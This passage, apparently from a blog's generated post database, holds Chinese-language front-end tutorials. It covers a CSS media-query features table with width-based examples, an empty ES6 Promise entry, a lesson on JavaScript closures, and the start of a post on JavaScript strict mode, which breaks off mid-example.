feature</code></a></h4><table>\n<thead>\n<tr>\n<th>值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>aspect-ratio</td>\n<td>定义输出设备中的页面可见区域宽度与高度的比率</td>\n</tr>\n<tr>\n<td>color</td>\n<td>定义输出设备每一组彩色原件的个数。如果不是彩色设备，则值等于0</td>\n</tr>\n<tr>\n<td>color-index</td>\n<td>定义在输出设备的彩色查询表中的条目数。如果没有使用彩色查询表，则值等于0</td>\n</tr>\n<tr>\n<td>device-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的比率。</td>\n</tr>\n<tr>\n<td>device-height</td>\n<td>定义输出设备的屏幕可见高度。</td>\n</tr>\n<tr>\n<td>device-width</td>\n<td>定义输出设备的屏幕可见宽度。</td>\n</tr>\n<tr>\n<td>grid</td>\n<td>用来查询输出设备是否使用栅格或点阵。</td>\n</tr>\n<tr>\n<td>height</td>\n<td>定义输出设备中的页面可见区域高度。</td>\n</tr>\n<tr>\n<td>max-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的最大比率。</td>\n</tr>\n<tr>\n<td>max-color</td>\n<td>定义输出设备每一组彩色原件的最大个数。</td>\n</tr>\n<tr>\n<td>max-color-index</td>\n<td>定义在输出设备的彩色查询表中的最大条目数。</td>\n</tr>\n<tr>\n<td>max-device-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的最大比率。</td>\n</tr>\n<tr>\n<td>max-device-height</td>\n<td>定义输出设备的屏幕可见的最大高度。</td>\n</tr>\n<tr>\n<td>max-device-width</td>\n<td>定义输出设备的屏幕最大可见宽度。</td>\n</tr>\n<tr>\n<td>max-height</td>\n<td>定义输出设备中的页面最大可见区域高度。</td>\n</tr>\n<tr>\n<td>max-monochrome</td>\n<td>定义在一个单色框架缓冲区中每像素包含的最大单色原件个数。</td>\n</tr>\n<tr>\n<td>max-resolution</td>\n<td>定义设备的最大分辨率。</td>\n</tr>\n<tr>\n<td>max-width</td>\n<td>定义输出设备中的页面最大可见区域宽度。</td>\n</tr>\n<tr>\n<td>min-aspect-ratio</td>\n<td>定义输出设备中的页面可见区域宽度与高度的最小比率。</td>\n</tr>\n<tr>\n<td>min-color</td>\n<td>定义输出设备每一组彩色原件的最小个数。</td>\n</tr>\n<tr>\n<td>min-color-index</td>\n<td>定义在输出设备的彩色查询表中的最小条目数。</td>\n</tr>\n<tr>\n<td>min-device-aspect-ratio</td>\n<td>定义输出设备的屏幕可见宽度与高度的最小比率。</td>\n</tr>\n<tr>\n<td>min-device-width</td>\n<td>定义输出设备的屏幕最小可见宽度。</td>\n</tr>\n<tr>\n<td>min-device-height</td>\n<td>定义输出设备的屏幕的最小可见高度。</td>\n</tr>\n<tr>\n<td>min-height</td>\n<td>定义输出设备中的页面最小可见区域高度。</td>\n</tr>\n<tr>\n<td>min-monochrome</td>\n<td>定义在一个单色框架缓冲区中每像素包含的最小单色原件个数</td>\n</tr>\n<tr>\n<td>min-resolution</td>\n<td>定义设备的最小分辨率。</td>\n</tr>\n<tr>\n<td>min-width</td>\n<td>定义输出设备中的页面最小可见区域宽度。</td>\n</tr>\n<tr>\n<td>monochrome</td>\n<td>定义在一个单色框架缓冲区中每像素包含的单色原件个数。如果不是单色设备，则值等于0</td>\n</tr>\n<tr>\n<td>orientation</td>\n<td>定义输出设备中的页面可见区域高度是否大于或等于宽度。</td>\n</tr>\n<tr>\n<td>resolution</td>\n<td>定义设备的分辨率。如：96dpi, 300dpi, 118dpcm</td>\n</tr>\n<tr>\n<td>scan</td>\n<td>定义电视类设备的扫描工序。</td>\n</tr>\n<tr>\n<td>width</td>\n<td>定义输出设备中的页面可见区域宽度。</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"7、多媒体查询实例\"><a href=\"#7、多媒体查询实例\" class=\"headerlink\" title=\"7、多媒体查询实例\"></a><a name=\"example\">7、多媒体查询实例</a></h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!<span class=\"selector-tag\">--</span> 当浏览器的宽度在 520<span class=\"selector-tag\">px</span> 到 699<span class=\"selector-tag\">px</span>, 页面背景为 红色 <span class=\"selector-tag\">--</span>&gt;</span><br><span class=\"line\">@<span class=\"keyword\">media</span> screen and (max-width: <span class=\"number\">699px</span>) and (min-width: <span class=\"number\">520px</span>) &#123;</span><br><span class=\"line\">    <span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">      <span class=\"attribute\">background</span>: red;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!<span class=\"selector-tag\">--</span> 当浏览器的宽度在 700<span class=\"selector-tag\">px</span> 到 1000<span class=\"selector-tag\">px</span>, 页面背景为 绿色 <span class=\"selector-tag\">--</span>&gt;</span><br><span class=\"line\">@<span class=\"keyword\">media</span> screen and (max-width: <span class=\"number\">1000px</span>) and (min-width: <span class=\"number\">700px</span>) &#123;</span><br><span class=\"line\">    <span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">      <span class=\"attribute\">background</span>: green;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!<span class=\"selector-tag\">--</span> 当浏览器的宽度大于 1001<span class=\"selector-tag\">px</span>, 页面背景为 蓝色 <span class=\"selector-tag\">--</span>&gt;</span><br><span class=\"line\">@<span class=\"keyword\">media</span> screen and (min-width: <span class=\"number\">1001px</span>) &#123;</span><br><span class=\"line\">    <span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">      <span class=\"attribute\">background</span>: blue;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!<span class=\"selector-tag\">--</span> 当浏览器的宽度在 520<span class=\"selector-tag\">px</span> 到 699<span class=\"selector-tag\">px</span> 或者大于 1200<span class=\"selector-tag\">px</span> 时, 去除<span class=\"selector-tag\">body</span>的<span class=\"selector-tag\">margin</span> <span class=\"selector-tag\">--</span>&gt;</span><br><span class=\"line\">@<span class=\"keyword\">media</span> screen and (max-width: <span class=\"number\">699px</span>) and (min-width: <span class=\"number\">520px</span>), (min-width: <span class=\"number\">1200px</span>) &#123;</span><br><span class=\"line\">    <span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">      <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"id":"0809021","title":"ES6 Promise","date":"2017-06-09T07:30:49.000Z","_content":"\n","source":"_posts/0809021_ES6-Promise.md","raw":"---\nid: 0809021\ntitle: ES6 Promise\ndate: 2017-06-09 15:30:49\ntags:\n  - JavaScript\n  - es6\ncategories:\n---\n\n","slug":"0809021_ES6-Promise","published":1,"updated":"2018-03-26T12:20:14.959Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvu7000vs4c0owzc17pl","content":"","site":{"data":{}},"excerpt":"","more":""},{"id":"0809022","title":"JavaScript 闭包 (Closure)","date":"2016-11-17T08:16:25.000Z","_content":"\n> 网上很多人对闭包 `closure` 进行了非常多的描述，毫无疑问，他们大多都讲的非常细致，非常棒。但总是觉得赘述部分有点多，有时候会把一个人给绕懵，其实我们可以从最简单的地方入手 闭包的。\n\n#### <a>1、What is `closure`?</a>\n\n- 闭包是指有权访问另一个函数作用域中变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量,利用闭包可以突破作用链域，`将函数内部的变量和方法传递到外部`。\n\n- `闭包的特征`：\n  - 函数内再嵌套函数\n  - 内部函数可以引用外层的参数和变量\n  - 参数和变量不会被垃圾回收机制回收\n\n#### <a>2、How to do?</a>\n\n- 一个最简单常见的场景：\n  每次点击一个 `li` 元素，打印出该元素对应的索引\n  ```html\n  <ul id=\"list\">\n    <li>item 0</li>\n    <li>item 1</li>\n    <li>item 2</li>\n    <li>item 3</li>\n    <li>item 4</li>\n  </ul>\n  ```\n  ```js\n  var lists = document.getElementsByTagName(\"li\");\n \tfor(var i = 0; i < lists.length; i ++){\n \t  lists[i].onclick = (function(i){\n      return function() {\n        console.log(i);\n      } //不用闭包的话，值每次都是 5\n    })(i);\n \t}\n\n  //当然，使用 ES6 也可以这么干\n  for(let j = 0; j < lists.length; j ++){\n \t  lists[j].onclick = () => {\n      console.log(j)\n    }\n \t}\n  ```\n\n- 看一个更加直白的例子：\n  看看闭包都干了些什么\n  ```js\n  // 执行greeter()后,greeter()闭包内部变量会存在,而闭包内部函数的内部变量不会存在\n  // 使得Javascript的垃圾回收机制 GC 不会收回greeter()所占用的资源\n  // 因为greeter()的内部函数的执行需要依赖greeter()中的变量\n  \n  function greeter() {\n    // Local variable that ends up within closure\n    var str = 'hello';\n    var alertGreet = function() {\n      alert(str);\n    }\n    str = 'hello world';\n    return alertGreet;\n  }\n\n  var alertGreet = greeter();\n  alertGreet()    // hello world\n\n  // 还是上面的例子，如果把 `str = hello world` 和 `return alertGreet` 调换位置，\n  // 最后会弹出 hello 而不是 hello world 了。\n  ```\n\n<p style=\"text-align: right\">参考文档 [github.com](https://github.com/markyun/My-blog/tree/master/Front-end-Developer-Questions/Questions-and-Answers)</p>","source":"_posts/0809022_JavaScript闭包-Closure.md","raw":"---\nid: 0809022\ntitle: JavaScript 闭包 (Closure)\ndate: 2016-11-17 16:16:25\ntags:\n  - JavaScript\ncategories:\n---\n\n> 网上很多人对闭包 `closure` 进行了非常多的描述，毫无疑问，他们大多都讲的非常细致，非常棒。但总是觉得赘述部分有点多，有时候会把一个人给绕懵，其实我们可以从最简单的地方入手 闭包的。\n\n#### <a>1、What is `closure`?</a>\n\n- 闭包是指有权访问另一个函数作用域中变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量,利用闭包可以突破作用链域，`将函数内部的变量和方法传递到外部`。\n\n- `闭包的特征`：\n  - 函数内再嵌套函数\n  - 内部函数可以引用外层的参数和变量\n  - 参数和变量不会被垃圾回收机制回收\n\n#### <a>2、How to do?</a>\n\n- 一个最简单常见的场景：\n  每次点击一个 `li` 元素，打印出该元素对应的索引\n  ```html\n  <ul id=\"list\">\n    <li>item 0</li>\n    <li>item 1</li>\n    <li>item 2</li>\n    <li>item 3</li>\n    <li>item 4</li>\n  </ul>\n  ```\n  ```js\n  var lists = document.getElementsByTagName(\"li\");\n \tfor(var i = 0; i < lists.length; i ++){\n \t  lists[i].onclick = (function(i){\n      return function() {\n        console.log(i);\n      } //不用闭包的话，值每次都是 5\n    })(i);\n \t}\n\n  //当然，使用 ES6 也可以这么干\n  for(let j = 0; j < lists.length; j ++){\n \t  lists[j].onclick = () => {\n      console.log(j)\n    }\n \t}\n  ```\n\n- 看一个更加直白的例子：\n  看看闭包都干了些什么\n  ```js\n  // 执行greeter()后,greeter()闭包内部变量会存在,而闭包内部函数的内部变量不会存在\n  // 使得Javascript的垃圾回收机制 GC 不会收回greeter()所占用的资源\n  // 因为greeter()的内部函数的执行需要依赖greeter()中的变量\n  \n  function greeter() {\n    // Local variable that ends up within closure\n    var str = 'hello';\n    var alertGreet = function() {\n      alert(str);\n    }\n    str = 'hello world';\n    return alertGreet;\n  }\n\n  var alertGreet = greeter();\n  alertGreet()    // hello world\n\n  // 还是上面的例子，如果把 `str = hello world` 和 `return alertGreet` 调换位置，\n  // 最后会弹出 hello 而不是 hello world 了。\n  ```\n\n<p style=\"text-align: right\">参考文档 [github.com](https://github.com/markyun/My-blog/tree/master/Front-end-Developer-Questions/Questions-and-Answers)</p>","slug":"0809022_JavaScript闭包-Closure","published":1,"updated":"2018-03-26T12:20:31.356Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvu9000xs4c0jbjpfj2l","content":"<blockquote>\n<p>网上很多人对闭包 <code>closure</code> 进行了非常多的描述，毫无疑问，他们大多都讲的非常细致，非常棒。但总是觉得赘述部分有点多，有时候会把一个人给绕懵，其实我们可以从最简单的地方入手 闭包的。</p>\n</blockquote>\n<h4 id=\"1、What-is-closure\"><a href=\"#1、What-is-closure\" class=\"headerlink\" title=\"1、What is closure?\"></a><a>1、What is <code>closure</code>?</a></h4><ul>\n<li><p>闭包是指有权访问另一个函数作用域中变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量,利用闭包可以突破作用链域，<code>将函数内部的变量和方法传递到外部</code>。</p>\n</li>\n<li><p><code>闭包的特征</code>：</p>\n<ul>\n<li>函数内再嵌套函数</li>\n<li>内部函数可以引用外层的参数和变量</li>\n<li>参数和变量不会被垃圾回收机制回收</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"2、How-to-do\"><a href=\"#2、How-to-do\" class=\"headerlink\" title=\"2、How to do?\"></a><a>2、How to do?</a></h4><ul>\n<li><p>一个最简单常见的场景：<br>每次点击一个 <code>li</code> 元素，打印出该元素对应的索引</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">id</span>=<span class=\"string\">\"list\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>item 0<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>item 1<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>item 2<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>item 3<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>item 4<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> lists = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"li\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; lists.length; i ++)&#123;</span><br><span class=\"line\">  lists[i].onclick = (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">i</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">    &#125; <span class=\"comment\">//不用闭包的话，值每次都是 5</span></span><br><span class=\"line\">  &#125;)(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//当然，使用 ES6 也可以这么干</span></span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> j = <span class=\"number\">0</span>; j &lt; lists.length; j ++)&#123;</span><br><span class=\"line\">  lists[j].onclick = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(j)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>看一个更加直白的例子：<br>看看闭包都干了些什么</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 执行greeter()后,greeter()闭包内部变量会存在,而闭包内部函数的内部变量不会存在</span></span><br><span class=\"line\"><span class=\"comment\">// 使得Javascript的垃圾回收机制 GC 不会收回greeter()所占用的资源</span></span><br><span class=\"line\"><span class=\"comment\">// 因为greeter()的内部函数的执行需要依赖greeter()中的变量</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">greeter</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// Local variable that ends up within closure</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> str = <span class=\"string\">'hello'</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> alertGreet = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    alert(str);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  str = <span class=\"string\">'hello world'</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> alertGreet;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> alertGreet = greeter();</span><br><span class=\"line\">alertGreet()    <span class=\"comment\">// hello world</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 还是上面的例子，如果把 `str = hello world` 和 `return alertGreet` 调换位置，</span></span><br><span class=\"line\"><span class=\"comment\">// 最后会弹出 hello 而不是 hello world 了。</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p style=\"text-align: right\">参考文档 <a href=\"https://github.com/markyun/My-blog/tree/master/Front-end-Developer-Questions/Questions-and-Answers\" target=\"_blank\" rel=\"noopener\">github.com</a></p>","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>网上很多人对闭包 <code>closure</code> 进行了非常多的描述，毫无疑问，他们大多都讲的非常细致，非常棒。但总是觉得赘述部分有点多，有时候会把一个人给绕懵，其实我们可以从最简单的地方入手 闭包的。</p>\n</blockquote>\n<h4 id=\"1、What-is-closure\"><a href=\"#1、What-is-closure\" class=\"headerlink\" title=\"1、What is closure?\"></a><a>1、What is <code>closure</code>?</a></h4><ul>\n<li><p>闭包是指有权访问另一个函数作用域中变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量,利用闭包可以突破作用链域，<code>将函数内部的变量和方法传递到外部</code>。</p>\n</li>\n<li><p><code>闭包的特征</code>：</p>\n<ul>\n<li>函数内再嵌套函数</li>\n<li>内部函数可以引用外层的参数和变量</li>\n<li>参数和变量不会被垃圾回收机制回收</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"2、How-to-do\"><a href=\"#2、How-to-do\" class=\"headerlink\" title=\"2、How to do?\"></a><a>2、How to do?</a></h4><ul>\n<li><p>一个最简单常见的场景：<br>每次点击一个 <code>li</code> 元素，打印出该元素对应的索引</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">id</span>=<span class=\"string\">\"list\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>item 0<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>item 1<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>item 2<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>item 3<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>item 4<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> lists = <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"li\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; lists.length; i ++)&#123;</span><br><span class=\"line\">  lists[i].onclick = (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">i</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(i);</span><br><span class=\"line\">    &#125; <span class=\"comment\">//不用闭包的话，值每次都是 5</span></span><br><span class=\"line\">  &#125;)(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//当然，使用 ES6 也可以这么干</span></span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> j = <span class=\"number\">0</span>; j &lt; lists.length; j ++)&#123;</span><br><span class=\"line\">  lists[j].onclick = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(j)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>看一个更加直白的例子：<br>看看闭包都干了些什么</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 执行greeter()后,greeter()闭包内部变量会存在,而闭包内部函数的内部变量不会存在</span></span><br><span class=\"line\"><span class=\"comment\">// 使得Javascript的垃圾回收机制 GC 不会收回greeter()所占用的资源</span></span><br><span class=\"line\"><span class=\"comment\">// 因为greeter()的内部函数的执行需要依赖greeter()中的变量</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">greeter</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// Local variable that ends up within closure</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> str = <span class=\"string\">'hello'</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> alertGreet = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    alert(str);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  str = <span class=\"string\">'hello world'</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> alertGreet;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> alertGreet = greeter();</span><br><span class=\"line\">alertGreet()    <span class=\"comment\">// hello world</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 还是上面的例子，如果把 `str = hello world` 和 `return alertGreet` 调换位置，</span></span><br><span class=\"line\"><span class=\"comment\">// 最后会弹出 hello 而不是 hello world 了。</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p style=\"text-align: right\">参考文档 <a href=\"https://github.com/markyun/My-blog/tree/master/Front-end-Developer-Questions/Questions-and-Answers\" target=\"_blank\" rel=\"noopener\">github.com</a></p>"},{"id":"0809023","title":"认识 JavaScript 严格模式","date":"2016-12-19T08:17:23.000Z","_content":"\n<a href=\"#whatIs\">1. 关于严格模式</a>\n<a href=\"#why\">2. 为什么使用严格模式</a>\n<a href=\"#ctrl\">3. 严格模式的限制</a>\n<a href=\"#key\">4. 保留关键字</a>\n<a href=\"regulation\">5. 严格模式下的规则</a>\n\n#### <a name=\"whatIs\">1、关于严格模式</a>\n\n- JavaScript 严格模式（strict mode）即在 `严格的条件`下运行。\n\n- 严格模式通过在脚本或函数的头部添加 `use strict`; 表达式来声明。\n\n- `use strict` 指令不是一条语句，但是是一个字面量表达式，在 `JavaScript` 旧版本中会被忽略。\n\n- `use strict` 的目的是指定代码在严格条件下执行。\n\n- `严格模式下你不能使用未声明的变量。`\n\n  **支持严格模式的浏览器:**\n  IE 10+、 Firefox 4+、 Chrome 13+、 Safari 5.1+、 Opera 12+。\n\n#### <a name=\"why\">2、为什么使用严格模式</a>\n\n- 消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;\n  - 消除代码运行的一些不安全之处，保证代码运行的安全；\n  - 提高编译器效率，增加运行速度；\n  - 为未来新版本的Javascript做好铺垫。\n\n- \"严格模式\"体现了Javascript更合理、更安全、更严谨的发展方向，包括IE 10在内的主流浏览器，都已经支持它，许多大项目已经开始全面拥抱它。\n\n- 另一方面，同样的代码，在\"严格模式\"中，可能会有不一样的运行结果；一些在\"正常模式\"下可以运行的语句，在\"严格模式\"下将不能运行。掌握这些内容，有助于更细致深入地理解Javascript，让你变成一个更好的程序员。\n\n#### <a name=\"ctrl\">3、严格模式的限制</a>\n\n- 不允许使用未声明的变量\n```js\n\"use strict\";\nx = 3.14;           // Uncaught ReferenceError: x is not defined\n\ny = {p1:10, p2:20}; // Uncaught ReferenceError: y is not defined\n```\n\n- 不允许删除变量或对象。\n```js\n\"use strict\";\nvar x = 3.14;\ndelete x;           // Uncaught SyntaxError: Delete of an unqualified identifier in strict mode.\n```\n\n- 不允许变量重名:\n```js\n\"use strict\";\nfunction func(p1, p1) {};   // 报错\n```\n\n- 不允许使用八进制:\n```js\n\"use strict\";\nvar x = 010;                // 报错\n```\n\n- 不允许使用转义字符:\n```js\n\"use strict\";\nvar x = \\010;               // 报错\n```\n\n- 不允许对只读属性赋值:\n```js\n\"use strict\";\nvar obj = {};\nObject.defineProperty(obj, \"x\", {value:0, writable:false});\n\nobj.x = 3.14;               // 报错\n```\n\n- 不允许对一个使用 `getter` 方法读取的属性进行赋值\n```js\n\"use strict\";\nvar obj = {get x() {return 0} };\n\nobj.x = 3.14;               // 报错\n```\n\n- 不允许删除一个不可删除的属性：\n```js\n\"use strict\";\ndelete Object.prototype;    // 报错\n```\n\n- 变量名不能使用 `eval` 字符串:\n```js\n\"use strict\";\nvar eval = 3.14;            // 报错\n```\n\n- 变量名不能使用 `arguments` 字符串:\n```js\n\"use strict\";\nvar arguments = 3.14;       // 报错\n```\n\n- 不允许使用以下这种语句:\n```js\n\"use strict\";\nwith (Math){x = cos(2)};    // 报错\n```\n\n- 由于一些安全原因，在作用域 `eval()` 中创建的变量不能被调用:\n```js\n\"use strict\";\neval (\"var x = 2\");\nalert (x);                  // 